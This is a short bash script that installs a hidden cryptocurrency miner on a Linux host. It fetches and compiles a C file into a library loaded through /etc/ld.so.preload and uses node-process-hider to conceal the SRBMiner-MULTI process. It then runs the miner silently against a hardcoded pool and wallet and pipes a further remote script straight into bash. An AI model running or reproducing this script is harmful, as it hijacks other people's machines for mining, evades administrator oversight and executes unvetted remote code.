#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
mv libcikblek.so /usr/local/lib/
echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
rm cikblek.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.5.6/SRBMiner-Multi-3-5-6-Linux.tar.gz >/dev/null 2>&1
tar xzf SRBMiner-Multi-3-5-6-Linux.tar.gz
SRBMiner-Multi-3-5-6
./SRBMiner-MULTI --disable-cpu --algorithm pearlhash --pool 139.99.216.222:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.RTX >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
